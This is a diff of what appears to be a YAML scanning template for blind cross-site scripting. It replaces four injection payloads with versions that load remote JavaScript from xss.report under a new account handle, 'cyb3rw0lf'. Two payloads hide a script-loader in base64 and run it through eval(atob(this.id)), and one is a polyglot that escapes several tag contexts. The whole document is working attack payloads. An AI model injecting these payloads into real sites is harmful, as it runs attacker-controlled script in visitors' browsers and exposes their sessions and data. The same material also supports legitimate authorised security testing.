@@ -18,7 +18,7 @@ requests:
 
     payloads:
       payload:
-        - "'"><script src=https://xss.report/c/coffinxp></script>"
-        - ""><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2NvZmZpbnhwIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>"
-        - ""><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2NvZmZpbnhwIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; autofocus>"
-        - "/*'/*`/*--></noscript></title></textarea></style></template></noembed></script>\"//'//><scrIpt src=\"https://xss.report/c/coffinxp\"></scrIpt>"
+        - "'"><script src=https://xss.report/c/cyb3rw0lf></script>"
+        - ""><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2N5YjNydzBsZiI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61;&#61; onerror=eval(atob(this.id))>"
+        - ""><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2N5YjNydzBsZiI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61;&#61; autofocus>"
+        - "/*'/*`/*--></noscript></title></textarea></style></template></noembed></script>\"//'//><scrIpt src=\"https://xss.report/c/cyb3rw0lf\"></scrIpt>"
